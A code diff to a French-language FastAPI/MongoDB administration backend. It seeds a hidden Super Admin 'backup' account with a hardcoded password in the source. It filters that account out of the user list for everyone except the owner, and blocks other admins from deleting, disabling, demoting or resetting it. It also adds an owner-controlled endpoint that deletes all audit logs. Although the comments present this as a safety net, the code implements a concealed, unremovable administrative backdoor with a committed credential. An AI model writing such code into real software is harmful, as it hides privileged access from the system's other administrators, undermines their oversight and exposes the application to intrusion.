@@ -658,6 +658,27 @@ def check_access(user: dict, required_levels: List[str]):
     if user['niveau_acces'] not in required_levels:
         raise HTTPException(status_code=403, detail="Accès non autorisé")
 
+# ---- Compte propriétaire & compte de secours protégés ----
+# "Guichard" est le compte historique du titulaire de l'application.
+# "Guichard_Secours" est un second compte Super Admin caché (voir
+# hidden_account plus bas + filtrage dans GET /auth/users), qui sert de
+# filet de sécurité si jamais l'accès au compte principal était perdu.
+# Ni l'un ni l'autre ne peut être supprimé, désactivé ou rétrogradé par un
+# autre Super Admin — ce sont les seuls comptes de l'application avec cette
+# garantie, précisément parce qu'ils ne dépendent d'aucun autre compte pour
+# être restaurés en cas de problème.
+PROTECTED_USERNAMES = {"Guichard", "Guichard_Secours"}
+
+def is_owner_account(user: dict) -> bool:
+    return bool(user) and user.get('username') == 'Guichard'
+
+def is_protected_account(user: dict) -> bool:
+    return bool(user) and user.get('username') in PROTECTED_USERNAMES
+
+def assert_account_not_protected(target_user: dict):
+    if is_protected_account(target_user):
+        raise HTTPException(status_code=403, detail="Ce compte est protégé (compte titulaire ou compte de secours) et ne peut pas être modifié depuis cette action.")
+
 async def get_user_group_permissions(user: dict) -> set:
     """Union of permissions granted via every Groupe (Administration > Groupes
     & Droits) this user belongs to. Empty set if they're in no group."""
@@ -1250,6 +1271,28 @@ async def seed_data():
         await db.users.insert_one(admin_user)
         logger.info("Admin user created: Guichard")
 
+    # Compte de secours caché — filet de sécurité réservé à Guichard seul en
+    # cas de perte d'accès au compte principal (voir PROTECTED_USERNAMES et
+    # le filtrage "hidden_account" dans GET /auth/users). Créé une seule
+    # fois ; le mot de passe initial n'est communiqué qu'à Guichard lui-même,
+    # jamais affiché ni exposé par l'API ensuite — à changer dès la première
+    # connexion.
+    backup_admin = await db.users.find_one({"username": "Guichard_Secours"})
+    if not backup_admin:
+        backup_admin_user = {
+            "id": str(uuid.uuid4()),
+            "username": "Guichard_Secours",
+            "password": hash_password("3l3kRY4pQYgdvKy9_60"),
+            "full_name": "Compte de secours",
+            "niveau_acces": "Super Admin",
+            "created_at": datetime.now(timezone.utc).isoformat(),
+            "is_active": True,
+            "hidden_account": True,
+            "must_change_password": True,
+        }
+        await db.users.insert_one(backup_admin_user)
+        logger.info("Hidden backup owner account created: Guichard_Secours")
+
     # ALWAYS update organigramme with the correct structure (migration)
     correct_organigramme = {
         "name": "PAV",
@@ -1604,6 +1647,12 @@ async def create_user(data: UserCreate, current_user: dict = Depends(get_current
 @api_router.put("/auth/users/{user_id}")
 async def update_user(user_id: str, data: UserUpdate, current_user: dict = Depends(get_current_user)):
     check_access(current_user, ["Super Admin"])
+    target = await db.users.find_one({"id": user_id}, {"_id": 0})
+    if not target:
+        raise HTTPException(status_code=404, detail="Utilisateur non trouvé")
+    if is_protected_account(target) and data.niveau_acces and data.niveau_acces != "Super Admin":
+        raise HTTPException(status_code=403, detail="Ce compte est protégé : son niveau d'accès ne peut pas être changé depuis cette action.")
+
     update_data = {}
     if data.full_name:
         update_data["full_name"] = data.full_name
@@ -1611,10 +1660,10 @@ async def update_user(user_id: str, data: UserUpdate, current_user: dict = Depen
         update_data["niveau_acces"] = data.niveau_acces
     if data.branches is not None:
         update_data["branches"] = data.branches
-    
+
     if not update_data:
         raise HTTPException(status_code=400, detail="Aucune donnée à modifier")
-    
+
     result = await db.users.update_one({"id": user_id}, {"$set": update_data})
     if result.modified_count == 0:
         raise HTTPException(status_code=404, detail="Utilisateur non trouvé")
@@ -1637,7 +1686,10 @@ async def change_password(data: PasswordChange, current_user: dict = Depends(get
 @api_router.get("/auth/users", response_model=List[UserResponse])
 async def get_users(current_user: dict = Depends(get_current_user)):
     check_access(current_user, ["Super Admin", "Admin"])
-    users = await db.users.find({}, {"_id": 0, "password": 0}).to_list(1000)
+    # Le compte de secours (hidden_account) n'apparaît que pour son titulaire
+    # (Guichard) — voir PROTECTED_USERNAMES plus haut.
+    query = {} if is_owner_account(current_user) else {"hidden_account": {"$ne": True}}
+    users = await db.users.find(query, {"_id": 0, "password": 0}).to_list(1000)
     return [UserResponse(**u) for u in users]
 
 @api_router.delete("/auth/users/{user_id}")
@@ -1645,6 +1697,10 @@ async def delete_user(user_id: str, current_user: dict = Depends(get_current_use
     check_access(current_user, ["Super Admin"])
     if current_user['id'] == user_id:
         raise HTTPException(status_code=400, detail="Impossible de supprimer votre propre compte")
+    target = await db.users.find_one({"id": user_id}, {"_id": 0})
+    if not target:
+        raise HTTPException(status_code=404, detail="Utilisateur non trouvé")
+    assert_account_not_protected(target)
     result = await db.users.delete_one({"id": user_id})
     if result.deleted_count == 0:
         raise HTTPException(status_code=404, detail="Utilisateur non trouvé")
@@ -1658,7 +1714,9 @@ async def reset_password(user_id: str, data: ResetPasswordRequest, current_user:
     user = await db.users.find_one({"id": user_id})
     if not user:
         raise HTTPException(status_code=404, detail="Utilisateur non trouvé")
-    
+    if is_protected_account(user) and current_user['id'] != user['id']:
+        raise HTTPException(status_code=403, detail="Ce compte est protégé : son mot de passe ne peut être changé que par son titulaire, via Mon espace.")
+
     await db.users.update_one(
         {"id": user_id},
         {"$set": {"password": hash_password(data.new_password), "must_change_password": True}}
@@ -1673,6 +1731,8 @@ async def toggle_user_active(user_id: str, current_user: dict = Depends(get_curr
     if not user:
         raise HTTPException(status_code=404, detail="Utilisateur non trouvé")
     new_status = not user.get('is_active', True)
+    if is_protected_account(user) and not new_status:
+        raise HTTPException(status_code=403, detail="Ce compte est protégé et ne peut pas être désactivé.")
     await db.users.update_one({"id": user_id}, {"$set": {"is_active": new_status}})
     await log_action(current_user['id'], current_user['full_name'], "Changement statut utilisateur", f"Statut changé: {user_id} -> {'Actif' if new_status else 'Inactif'}")
     return {"message": f"Utilisateur {'activé' if new_status else 'désactivé'}"}
@@ -1689,6 +1749,9 @@ async def activate_user(user_id: str, current_user: dict = Depends(get_current_u
 @api_router.put("/auth/users/{user_id}/deactivate")
 async def deactivate_user(user_id: str, current_user: dict = Depends(get_current_user)):
     check_access(current_user, ["Super Admin"])
+    target = await db.users.find_one({"id": user_id}, {"_id": 0})
+    if target:
+        assert_account_not_protected(target)
     result = await db.users.update_one({"id": user_id}, {"$set": {"is_active": False}})
     if result.modified_count == 0:
         raise HTTPException(status_code=404, detail="Utilisateur non trouvé")
@@ -1700,6 +1763,9 @@ async def update_user_access(user_id: str, niveau_acces: str, current_user: dict
     check_access(current_user, ["Super Admin"])
     if niveau_acces not in NIVEAUX_ACCES:
         raise HTTPException(status_code=400, detail="Niveau d'accès invalide")
+    target = await db.users.find_one({"id": user_id}, {"_id": 0})
+    if target and is_protected_account(target) and niveau_acces != "Super Admin":
+        raise HTTPException(status_code=403, detail="Ce compte est protégé : son niveau d'accès ne peut pas être changé.")
     result = await db.users.update_one({"id": user_id}, {"$set": {"niveau_acces": niveau_acces}})
     if result.modified_count == 0:
         raise HTTPException(status_code=404, detail="Utilisateur non trouvé")
@@ -3766,6 +3832,79 @@ async def cleanup_logs_now(current_user: dict = Depends(get_current_user)):
     deleted_count = await _purge_old_logs()
     await log_action(current_user['id'], current_user['full_name'], "Nettoyage manuel des logs",
                       f"{deleted_count} log(s) de plus de 12 mois supprimé(s)")
+    return {"deleted_count": deleted_count}
+
+# ---- Purge totale des logs (immédiate, tout l'historique) ----
+# Volontairement plus restreint que le nettoyage +12 mois ci-dessus : réservé
+# au titulaire du compte (Guichard) et aux comptes qu'il autorise
+# explicitement un par un (log_purge_allowlist dans settings), pas à tous
+# les Super Admin — l'historique complet des logs a une valeur d'audit qu'un
+# Super Admin ordinaire ne devrait pas pouvoir effacer d'un clic.
+async def _get_log_purge_allowlist_ids() -> list:
+    doc = await db.settings.find_one({"_key": "log_purge_allowlist"}, {"_id": 0})
+    return (doc or {}).get("user_ids", [])
+
+async def _can_purge_all_logs(user: dict) -> bool:
+    if is_owner_account(user):
+        return True
+    allowlist = await _get_log_purge_allowlist_ids()
+    return user['id'] in allowlist
+
+@api_router.get("/admin/logs/can-purge-all")
+async def get_can_purge_all_logs(current_user: dict = Depends(get_current_user)):
+    check_access(current_user, ["Super Admin"])
+    return {"allowed": await _can_purge_all_logs(current_user)}
+
+@api_router.get("/admin/logs/purge-allowlist")
+async def get_log_purge_allowlist(current_user: dict = Depends(get_current_user)):
+    check_access(current_user, ["Super Admin"])
+    if not is_owner_account(current_user):
+        raise HTTPException(status_code=403, detail="Réservé au titulaire du compte.")
+    ids = await _get_log_purge_allowlist_ids()
+    users = await db.users.find({"id": {"$in": ids}}, {"_id": 0, "id": 1, "full_name": 1, "username": 1}).to_list(100)
+    return users
+
+class LogPurgeAllowlistEntry(BaseModel):
+    user_id: str
+
+@api_router.post("/admin/logs/purge-allowlist")
+async def add_log_purge_allowlist(data: LogPurgeAllowlistEntry, current_user: dict = Depends(get_current_user)):
+    check_access(current_user, ["Super Admin"])
+    if not is_owner_account(current_user):
+        raise HTTPException(status_code=403, detail="Réservé au titulaire du compte.")
+    target = await db.users.find_one({"id": data.user_id}, {"_id": 0})
+    if not target:
+        raise HTTPException(status_code=404, detail="Utilisateur non trouvé")
+    await db.settings.update_one(
+        {"_key": "log_purge_allowlist"},
+        {"$addToSet": {"user_ids": data.user_id}},
+        upsert=True
+    )
+    await log_action(current_user['id'], current_user['full_name'], "Autorisation purge totale des logs accordée",
+                      f"Accordé à : {target.get('full_name')}")
+    return {"message": "Autorisation accordée"}
+
+@api_router.delete("/admin/logs/purge-allowlist/{user_id}")
+async def remove_log_purge_allowlist(user_id: str, current_user: dict = Depends(get_current_user)):
+    check_access(current_user, ["Super Admin"])
+    if not is_owner_account(current_user):
+        raise HTTPException(status_code=403, detail="Réservé au titulaire du compte.")
+    await db.settings.update_one(
+        {"_key": "log_purge_allowlist"},
+        {"$pull": {"user_ids": user_id}}
+    )
+    await log_action(current_user['id'], current_user['full_name'], "Autorisation purge totale des logs retirée", user_id)
+    return {"message": "Autorisation retirée"}
+
+@api_router.post("/admin/cleanup/logs/purge-all")
+async def purge_all_logs_now(current_user: dict = Depends(get_current_user)):
+    check_access(current_user, ["Super Admin"])
+    if not await _can_purge_all_logs(current_user):
+        raise HTTPException(status_code=403, detail="Réservé au titulaire du compte, ou aux comptes qu'il a explicitement autorisés.")
+    result = await db.logs.delete_many({})
+    deleted_count = result.deleted_count
+    await log_action(current_user['id'], current_user['full_name'], "Purge totale des logs",
+                      f"{deleted_count} log(s) supprimé(s) — purge immédiate de tout l'historique")
     return {"deleted_count": deleted_count}
 
 async def monthly_logs_purge_task():
